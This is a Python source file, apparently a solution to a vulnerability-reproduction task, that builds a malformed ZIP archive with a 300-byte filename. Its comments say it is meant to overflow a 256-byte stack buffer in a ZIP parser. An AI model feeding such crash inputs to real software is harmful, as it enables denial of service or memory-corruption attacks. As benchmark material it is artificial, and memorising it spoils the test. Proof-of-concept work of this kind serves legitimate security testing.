import struct
import binascii


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ZIP with a filename > 256 bytes to trigger stack overflow
        name_len = 300  # > 256 to overflow 256-byte stack buffer
        filename = b"A" * name_len
        data = b"B"  # minimal non-empty data to ensure entry processing
        crc = binascii.crc32(data) & 0xFFFFFFFF

        # Local File Header
        # struct:
        # signature, ver_needed, flags, method, mod_time, mod_date, crc32, comp_size, uncomp_size, fname_len, extra_len
        lfh = struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,  # Local file header signature
            20,          # Version needed to extract
            0,           # General purpose bit flag
            0,           # Compression method (stored)
            0,           # Last mod time
            0,           # Last mod date
            crc,         # CRC-32
            len(data),   # Compressed size
            len(data),   # Uncompressed size
            len(filename),  # File name length
            0            # Extra field length
        )
        local_part = lfh + filename + data

        # Central Directory File Header
        # struct:
        # signature, ver_made, ver_needed, flags, method, mod_time, mod_date, crc32, comp_size, uncomp_size,
        # fname_len, extra_len, comment_len, disk_start, int_attr, ext_attr, rel_offset
        cdfh = (
            struct.pack("<I", 0x02014B50) +  # Central dir file header signature
            struct.pack("<H", 20) +          # Version made by
            struct.pack("<H", 20) +          # Version needed to extract
            struct.pack("<H", 0) +           # General purpose bit flag
            struct.pack("<H", 0) +           # Compression method
            struct.pack("<H", 0) +           # Last mod file time
            struct.pack("<H", 0) +           # Last mod file date
            struct.pack("<I", crc) +         # CRC-32
            struct.pack("<I", len(data)) +   # Compressed size
            struct.pack("<I", len(data)) +   # Uncompressed size
            struct.pack("<H", len(filename)) +  # File name length
            struct.pack("<H", 0) +           # Extra field length
            struct.pack("<H", 0) +           # File comment length
            struct.pack("<H", 0) +           # Disk number start
            struct.pack("<H", 0) +           # Internal file attributes
            struct.pack("<I", 0) +           # External file attributes
            struct.pack("<I", 0)             # Relative offset of local header (0, since local header starts at 0)
        ) + filename

        # End of Central Directory
        size_of_central_dir = len(cdfh)
        offset_of_central_dir = len(local_part)
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,       # End of central dir signature
            0,                # Number of this disk
            0,                # Number of the disk with the start of the central directory
            1,                # Total number of entries in the central dir on this disk
            1,                # Total number of entries in the central dir
            size_of_central_dir,   # Size of the central directory
            offset_of_central_dir, # Offset of start of central directory
            0                 # .ZIP file comment length
        )

        return local_part + cdfh + eocd
